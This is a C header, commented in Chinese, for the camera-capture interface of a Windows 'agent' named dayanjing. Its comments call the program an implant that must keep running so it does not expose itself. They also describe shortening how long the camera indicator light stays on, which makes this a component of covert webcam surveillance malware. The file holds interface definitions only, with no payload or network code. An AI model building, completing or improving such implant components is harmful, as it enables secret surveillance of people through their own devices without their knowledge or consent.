#ifndef DAYANJING_AGENT_WINDOWS_CAMERA_H
#define DAYANJING_AGENT_WINDOWS_CAMERA_H

/*
 * agent_windows/camera.h
 *
 * 摄像头采集核心接口。
 *
 * 设计目标：
 *   1. 源可替换：采集后端与协议层解耦，Windows 真机走 Media Foundation，
 *      测试/沙盒走 Mock 桩，协议层不感知差异。
 *   2. 格式协商：枚举设备原生格式，按优先级协商（MJPEG > YUYV/NV12），
 *      YUYV/NV12 必须经转码后才能当 JPEG 使用，禁止把 YUV 原始字节
 *      当 JPEG 落盘/传输。
 *   3. 流控：ReadSample 必须循环处理，捕获 ENDOFSTREAM / ENDOFMEDIA 标志。
 *   4. 按需短时触发：采集完立即释放设备句柄，缩短指示灯点亮窗口。
 *
 * 已知约束（硬件层，软件不可解）：
 *   多数现代设备的摄像头指示灯由固件直接控制，软件无法关闭。
 *   本模块不承诺静默，只承诺"短时触发、立即释放"。
 */

#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#ifdef __cplusplus
extern "C" {
#endif

/* 像素格式。native 为设备原生格式，交付层统一转码为 JPEG。 */
typedef enum {
    CAM_FMT_NONE = 0,
    CAM_FMT_MJPEG,      /* 帧已是 JPEG，可直接使用 */
    CAM_FMT_YUYV422,    /* 需转码 */
    CAM_FMT_NV12,       /* 需转码 */
    CAM_FMT_RGB24,      /* 需转码 */
    CAM_FMT_UNKNOWN
} cam_pixel_fmt_t;

/* 单帧数据。data 归 CameraSource 所有，调用方只读。 */
typedef struct {
    const uint8_t *data;
    size_t         len;
    cam_pixel_fmt_t fmt;
    uint32_t        width;
    uint32_t        height;
    uint64_t        pts_us;   /* 呈现时间戳，微秒 */
} cam_frame_t;

/* 采集配置 */
typedef struct {
    uint32_t width;          /* 期望宽度，0 表示不指定 */
    uint32_t height;         /* 期望高度，0 表示不指定 */
    uint32_t fps;            /* 期望帧率，0 表示不指定 */
    uint32_t capture_ms;     /* 采集窗口时长（毫秒），到点即释放句柄 */
    uint32_t max_frames;     /* 最多采集帧数，0 表示不限（受 capture_ms 约束） */
    bool     prefer_mjpeg;   /* true: 优先 MJPEG；false: 优先未压缩格式 */
} cam_config_t;

/* 错误码 */
typedef enum {
    CAM_OK = 0,
    CAM_ERR_GENERIC,
    CAM_ERR_NO_DEVICE,        /* 无可访问摄像头设备 */
    CAM_ERR_NO_PERMISSION,    /* 权限/授权被拒绝（CapabilityAccessManager） */
    CAM_ERR_FORMAT_NEGOTIATE, /* 格式协商失败 */
    CAM_ERR_TRANSFORM,        /* 转码失败 */
    CAM_ERR_TIMEOUT,
    CAM_ERR_NOT_OPEN,
    CAM_ERR_INVALID_ARG
} cam_err_t;

/* 降级原因：当前产出的像素是否来自真摄像头。
 *
 * 为什么需要它（修掉的真实缺陷）：
 *   cam_linux_v4l2.c 在 V4L2 初始化失败时静默切到内置合成帧，且 open 仍返回
 *   CAM_OK。于是"设备不存在"与"设备存在但打不开"在调用方看来完全一样——
 *   都是 CAPTURE=OK、都有合法 JPEG、都零报错。
 *
 *   后者在真机上是常见场景：摄像头正被别的进程占用（视频会议/直播已开流），
 *   open 与格式协商都能过，REQBUFS/STREAMON 才失败。此时那台机器明明有摄像
 *   头，而运维看到的是"一切正常"，收到的却是棋盘格。这是最难被发现的一类
 *   失效，因为它不报错、不失败，只是画面一直是假的。
 *
 *   本枚举把两者分开：NO_DEVICE 是合法降级（无摄像头机器本就该走合成帧），
 *   DEVICE_BUSY 是必须可见的异常。 */
typedef enum {
    CAM_DEGRADE_NONE = 0,      /* 真设备，像素来自摄像头 */
    CAM_DEGRADE_NO_DEVICE,     /* 未找到任何采集设备（如无 /dev/video*） */
    CAM_DEGRADE_DEVICE_BUSY    /* 设备存在且是采集设备，但打不开（被占用等） */
} cam_degrade_t;

/* 设备信息 */
typedef struct {
    char   device_id[128];
    char   friendly_name[128];
    bool   has_permission;   /* 当前进程是否被授权访问摄像头 */
} cam_device_info_t;

/* CameraSource 接口（源可替换） */
typedef struct cam_source cam_source_t;

struct cam_source {
    /* 打开设备并协商格式；成功返回 CAM_OK，source 处于就绪态 */
    cam_err_t (*open)(cam_source_t *self, const cam_config_t *cfg);

    /* 采集一帧；阻塞直到拿到帧或超时。frame 指向内部缓冲区，只读 */
    cam_err_t (*capture)(cam_source_t *self, cam_frame_t *frame);

    /* 关闭设备并释放句柄。必须释放，不可泄漏 */
    void      (*close)(cam_source_t *self);

    /* 枚举可用设备，info 数组由调用方提供，最多 count 项；返回实际设备数 */
    int       (*enumerate)(cam_device_info_t *info, int count);

    /* 判断当前进程是否有摄像头权限 */
    bool      (*check_permission)(void);

    /* 后端析构。由各后端在构造时设置，cam_source_destroy 在 cam_factory.c
     * 中统一实现并转调它。
     *
     * 此前各后端各自导出一份 cam_source_destroy，与 cam_source_create 是
     * 同一个问题：同一条链接里只能存在一个后端，否则重复符号。析构逻辑
     * 本身各后端并不同（mock 用 free、MF 用 CoTaskMemFree + delete），无法
     * 简单合并，故改为函数指针由后端自带。 */
    void      (*destroy)(cam_source_t *self);

    /* 降级原因。0 = CAM_DEGRADE_NONE（真设备）；非 0 表示当前产出的是合成
     * 帧，调用方拿到的画面不是摄像头来的。由后端在 open 时设置。
     *
     * 刻意不做成"降级即返回错误"：驻留进程需要继续跑（否则摄像头一被占用
     * 整个植入体就退出，反而暴露自己），但"画面是假的"这件事必须对上层可
     * 见——不可见就是静默失效。 */
    int degrade;

    void *priv;  /* 后端私有数据 */
};

/*
 * 工厂函数。
 *   backend = "mock"   : 返回 Mock 桩，喂测试帧，沙盒/无设备环境用
 *   backend = "mf"     : 返回 Media Foundation 后端，仅 Windows 真机可用
 *   backend = NULL     : 按当前平台自动选择
 */
cam_source_t *cam_source_create(const char *backend);
void          cam_source_destroy(cam_source_t *src);

/* 查询当前是否在产合成帧（见 cam_degrade_t）。
 *
 * 独立函数而非直接读 src->degrade：后端可以在 open 之前被调用方查询，此时
 * priv 未初始化，直接解引用有风险；且后续若要加"跨后端统一判定"（如 MF 后端
 * 的降级也要纳入），改一处即可，不必改所有调用点。 */
int cam_source_degrade(const cam_source_t *src);

/* 转码：将 frame 转成 JPEG，写入 out（调用方分配，容量 *out_cap 传入，
 * 实际写入字节数写回 *out_len）。返回 CAM_OK 表示成功。 */
cam_err_t cam_frame_to_jpeg(const cam_frame_t *frame,
                            uint8_t *out, size_t *out_cap, size_t *out_len);

/* 将 cam_err_t 转为可读字符串 */
const char *cam_errstr(cam_err_t e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_CAMERA_H */
